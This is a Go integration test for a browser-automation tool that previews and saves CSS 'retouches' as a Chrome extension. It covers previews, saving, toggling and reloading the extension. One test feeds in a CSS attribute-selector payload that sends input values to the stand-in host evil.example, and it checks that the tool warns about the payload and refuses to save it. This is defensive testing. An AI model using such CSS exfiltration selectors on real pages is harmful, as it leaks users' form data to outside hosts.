//go:build integration

package app_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/JonathanSantos/vitral/internal/config"
)

// requireCfT pula quando o navegador dos testes não é o Chrome for Testing: o Chrome comum ignora
// --load-extension e o Extensions.loadUnpacked.
func requireCfT(t *testing.T, path string) {
	t.Helper()
	if !strings.Contains(path, "Chrome for Testing") && !strings.Contains(path, string(filepath.Separator)+"chrome-") {
		t.Skipf("retouches need Chrome for Testing (extensions); the tests run %q", path)
	}
}

// callFull chama uma ferramenta e devolve todo o conteúdo (texto e imagens).
func (h *harness) callFull(t *testing.T, name string, args map[string]any) *mcp.CallToolResult {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	res, err := h.session.CallTool(ctx, &mcp.CallToolParams{Name: name, Arguments: args})
	if err != nil {
		t.Fatalf("%s: %v", name, err)
	}
	return res
}

func (h *harness) bodyBackground(t *testing.T) string {
	t.Helper()
	return h.mainWorld(t, `() => ({bg: getComputedStyle(document.body).backgroundColor})`)["bg"].(string)
}

// waitBackground espera a cor de fundo (a extensão aplica de forma assíncrona depois do toggle).
func (h *harness) waitBackground(t *testing.T, want string) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for {
		got := h.bodyBackground(t)
		if got == want {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("background %q, want %q", got, want)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func TestRetouches(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "retoques")
	tweak := func(c *config.Config) { c.RetouchesDir = dir }
	requireCfT(t, testBrowserPath())
	rh, cleanup := newHarness(tweak)
	closed := false
	defer func() {
		if !closed {
			cleanup()
		}
	}()
	const dark = "rgb(17, 17, 17)"
	const plain = "rgba(0, 0, 0, 0)"

	// Prévia: só na aba, com a contagem do que cada regra pegou.
	rh.ok(t, "open", map[string]any{"url": rh.url("/pages/mini/pedidos.html")})
	prev := rh.ok(t, "retouch_preview", map[string]any{"css": "body { background: #111 } td { font-size: 18px } .nao-existe { color: red }"})
	mustContain(t, prev, `"body": 1 element`, `"td": 8 elements`, `".nao-existe": 0 elements (matches nothing on this page)`, "retouch_save with preview=true")
	if got := rh.bodyBackground(t); got != dark {
		t.Fatalf("preview not applied: %s", got)
	}
	rh.fail(t, "retouch_save", map[string]any{"name": "Tema"}, "invalid retouch name")

	// Prévia do save: onde vale e os prints de antes e depois; nada gravado ainda.
	res := rh.callFull(t, "retouch_save", map[string]any{"name": "tema-escuro", "description": "Fundo escuro", "preview": true})
	if res.IsError || len(res.Content) != 5 {
		t.Fatalf("save preview: %+v", res.Content)
	}
	mustContain(t, res.Content[0].(*mcp.TextContent).Text, `every page of 127.0.0.1 (*://127.0.0.1/*)`, `only name="tema-escuro"`)
	before, after := res.Content[2].(*mcp.ImageContent), res.Content[4].(*mcp.ImageContent)
	if before.MIMEType != "image/png" || len(before.Data) == 0 || string(before.Data) == string(after.Data) {
		t.Fatal("before and after pictures should differ")
	}
	if got := rh.bodyBackground(t); got != dark {
		t.Fatalf("the preview must come back after the before picture: %s", got)
	}
	if _, err := os.Stat(filepath.Join(dir, "tema-escuro")); !os.IsNotExist(err) {
		t.Fatalf("preview must not save: %v", err)
	}

	// Save só com o nome: grava a prévia, compila e carrega a extensão sem reiniciar.
	saved := rh.ok(t, "retouch_save", map[string]any{"name": "tema-escuro"})
	mustContain(t, saved, `retouch "tema-escuro" saved`, "every page of 127.0.0.1", "Vitral button")
	if _, err := os.Stat(filepath.Join(dir, "tema-escuro", "style.css")); err != nil {
		t.Fatal(err)
	}
	if got := rh.bodyBackground(t); got != dark {
		t.Fatalf("the preview stays on the open page after saving: %s", got)
	}
	// Outra página do mesmo site (porta aleatória): o retoque vale pela extensão.
	rh.ok(t, "open", map[string]any{"url": rh.url("/pages/mini/clientes.html")})
	if got := rh.bodyBackground(t); got != dark {
		t.Fatalf("saved retouch not applied by the extension: %s", got)
	}
	mustContain(t, rh.ok(t, "retouch_list", nil), `tema-escuro: "Fundo escuro" · *://127.0.0.1/* · on here`)

	// Interruptor e "Ver original".
	mustContain(t, rh.ok(t, "retouch_toggle", map[string]any{"name": "tema-escuro", "on": false}), `is off`)
	rh.waitBackground(t, plain)
	mustContain(t, rh.ok(t, "retouch_list", nil), "off here")
	rh.ok(t, "retouch_toggle", map[string]any{"name": "tema-escuro", "on": true})
	rh.waitBackground(t, dark)
	rh.mainWorld(t, `() => { document.documentElement.setAttribute('data-vitral-original', ''); return {}; }`)
	rh.waitBackground(t, plain)
	mustContain(t, rh.ok(t, "retouch_list", nil), "showing the original")
	rh.mainWorld(t, `() => { document.documentElement.removeAttribute('data-vitral-original'); return {}; }`)
	rh.waitBackground(t, dark)
	rh.fail(t, "retouch_toggle", map[string]any{"name": "nada", "on": true}, `no retouch named "nada"`)

	// CSS que busca algo em outro host: o save é recusado sem ignoreWarnings.
	prev = rh.ok(t, "retouch_preview", map[string]any{"css": `input[value^="a"] { background: url(https://evil.example/a) }`})
	mustContain(t, prev, "warnings:", "evil.example")
	rh.fail(t, "retouch_save", map[string]any{"name": "vaza"}, "retouch not saved")
	mustContain(t, rh.ok(t, "retouch_discard", nil), "removed")
	mustContain(t, rh.ok(t, "retouch_discard", nil), "no retouch preview")
	rh.fail(t, "retouch_save", map[string]any{"name": "vaza"}, "no retouch preview")

	// Outro navegador com a mesma pasta: a extensão entra no lançamento (--load-extension) e aplica
	// já no primeiro documento; um retoque novo recarrega essa extensão sem reiniciar.
	cleanup()
	closed = true
	rh2, cleanup2 := newHarness(tweak)
	defer cleanup2()
	rh2.ok(t, "open", map[string]any{"url": rh2.url("/pages/mini/index.html")})
	if got := rh2.bodyBackground(t); got != dark {
		t.Fatalf("retouch not loaded at launch: %s", got)
	}
	rh2.ok(t, "retouch_preview", map[string]any{"css": "h1 { color: rgb(200, 0, 0) }"})
	rh2.ok(t, "retouch_save", map[string]any{"name": "titulo", "scope": "all"})
	rh2.ok(t, "open", map[string]any{"url": rh2.url("/pages/mini/pedidos.html")})
	got := rh2.mainWorld(t, `() => ({h1: getComputedStyle(document.querySelector('h1')).color, bg: getComputedStyle(document.body).backgroundColor})`)
	if got["h1"] != "rgb(200, 0, 0)" || got["bg"] != dark {
		t.Fatalf("reloading the launch-time extension should keep both retouches: %v", got)
	}
}
